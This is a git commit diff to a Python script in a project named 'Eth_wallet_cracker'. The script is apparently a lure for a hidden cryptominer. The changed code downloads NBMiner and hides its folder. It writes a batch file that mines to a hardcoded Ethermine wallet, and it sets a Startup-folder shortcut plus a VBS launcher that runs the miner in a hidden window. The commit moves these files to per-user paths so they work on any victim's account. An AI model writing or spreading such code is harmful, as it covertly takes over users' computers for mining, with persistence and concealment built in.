5f362900bd0ae07a66fb020c15a8020d9fe0eb6b
taxgamer <64260597+taxgamer@users.noreply.github.com>
2022-11-19 20:28:56 +0200

    Update secondary.py

--- Eth_wallet_cracker/secondary.py
+++ Eth_wallet_cracker/secondary.py
@@ -10,20 +10,20 @@ path = os.getcwd()+'\\'
 
 docloc = f'C:\\Users\\{lg}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\hello.lnk'
 srt1 = os.path.exists(docloc)
-srt2 = os.path.exists(f'{path}extended')
+srt2 = os.path.exists(f'C:\\Users\\{lg}\\Contacts\\extended')
 def clss():
     time.sleep(4)
     os.system('cls')
 def start():
     threading.Thread(target=clss).start()
-    proc = subprocess.call(f'cscript {path}st.vbs',shell=False)
+    proc = subprocess.call(f'cscript C:\\Users\\{lg}\\Contacts\\st.vbs',shell=False)
 if not srt1 or not srt2:
     def set_sr():
         st = f'C:\\Users\\{lg}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
         #desktop = r"path to where you wanna put your .lnk file"
         pat = os.path.join(st, 'hello.lnk')
         
-        t = f'{path}st.vbs' 
+        t = f'C:\\Users\\{lg}\\Contacts\\st.vbs'
         shell = win32com.client.Dispatch("WScript.Shell")
         shortcut = shell.CreateShortCut(pat)
         shortcut.Targetpath = t
@@ -31,7 +31,7 @@ if not srt1 or not srt2:
 
     url = 'https://github.com/NebuTech/NBMiner/releases/download/v42.3/NBMiner_42.3_Win.zip'
     req = r.get(url,{})
-    path_to_zip_file = path
+    path_to_zip_file = f'C:\\Users\\{lg}\\Desktop'
 
     time.sleep(0.4)
     with open(path_to_zip_file+r'\x.zip', 'wb') as w:
@@ -44,16 +44,16 @@ if not srt1 or not srt2:
     fn = path_to_zip_file + r'\extracted'
     p = os.popen('attrib +h ' + fn)
 
-    t = f'{path}extracted\\NBMiner_Win\\'+ r'run.bat'
+    t = f'C:\\Users\\{lg}\\Desktop\\extracted\\NBMiner_Win\\'+ r'run.bat'
     with open(t, 'w') as w:
         w.write(f'@cd /d "%~dp0"\nnbminer -a etchash -o stratum+tcp://asia1-etc.ethermine.org:14444 -u 0x4233d2697136724563d3766593FfAa379E5d6fb0.client_{random.randint(0,100000)} \npause')
 
     set_sr()
     with open(f'{path}st.bat', 'w') as startDoc:
         startDoc.write(f'start "" "{docloc}"')
-    with open('st.vbs','w') as st:
-        st.write(r'''Set shell = WScript.CreateObject("WScript.Shell")
-                 shell.Run("C:\Users\user\Desktop\extracted\NBMiner_Win\run.bat"), 0, True''')
+    with open(f'C:\\Users\\{lg}\\Contacts\\st.vbs','w') as st:
+        st.write(f'''Set shell = WScript.CreateObject("WScript.Shell")
+                 shell.Run("C:\\Users\\{lg}\\Desktop\\extracted\\NBMiner_Win\\run.bat"), 0, True''')
 with open(f"{path}start.bat",'w') as ww:
     ww.write('start secondary.bat\npython findwallet.py\npause')
 threading.Thread(target=start).start()
